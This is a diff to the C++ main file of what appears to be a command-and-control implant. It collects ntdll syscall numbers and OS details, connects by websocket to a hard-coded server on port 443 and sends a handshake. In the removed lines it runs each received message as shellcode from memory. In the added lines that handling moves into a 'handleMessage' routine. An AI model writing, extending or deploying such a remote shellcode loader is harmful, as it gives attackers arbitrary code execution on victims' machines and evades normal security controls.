@@ -1,24 +1,17 @@
 #include "global.hpp"
 #include "connection.hpp"
 #include "identifier.hpp"
+#include <thread>
 vector<pair<string, DWORD>> getNtdllSyscalls();
 string pairsToString(const vector<pair<string, DWORD>>& values);
 PVOID getMem();
-typedef unsigned long long (*ShellcodeFunc)();
+string handleMessage(string& msg, PVOID mem);
 
-void printStringAsHex(const string& s) {
-    for (unsigned char c : s) {
-        cout << "0x"
-             << hex << setw(2) << setfill('0')
-             << static_cast<int>(c) << ' ';
-    }
-    cout << dec << '\n';
-}
 
 int main() {
     vector<pair<string, DWORD>> syscalls = getNtdllSyscalls();
     string syscall_list = pairsToString(syscalls);
-    const wstring host = L"192.168.2.7";
+    const wstring host = L"192.168.64.1";
     const INTERNET_PORT port = 443;
     wstring path = L"/api/v1/anon/agent/ws/";
     wstring identifier = random_uuid();
@@ -31,14 +24,20 @@ int main() {
         cleanup(client);
         return 1;
     }
-
     PVOID mem = getMem();
+    PVOID scratchpad = getMem();
     cout << "Memory = " << (hex) << mem << endl;
-    string handshake = random_uuid_s();
-    handshake += "os:";
+    string handshake;
+    handshake.append(1,(char)0);
     handshake += getOperatingSystem();
     handshake += ";";
+    stringstream ss;
+    ss << hex << (unsigned long long) scratchpad;
+    string s = ss.str();
+    handshake += s;
+    handshake += ";";
     handshake += syscall_list;
+    cout << "Sending handshake: " << handshake << endl;;
     if (!sendText(client.websocket, handshake)) {
         cleanup(client);
         return 1;
@@ -49,14 +48,7 @@ int main() {
         if (!receiveText(client.websocket, message)) {
             break;
         }
-        printStringAsHex(message);
-        memcpy(mem, message.c_str(), message.size());
-        ShellcodeFunc exec = (ShellcodeFunc) mem;
-        cout << "About to exec." << endl;
-        unsigned long long retval = exec();
-        cout << "Exec complete." << endl;
-        string returnstring = to_string(retval);
-        cout << "return value 0x" << retval << endl;
+        string returnstring = handleMessage(message, mem);
         sendText(client.websocket, returnstring);
     }
 
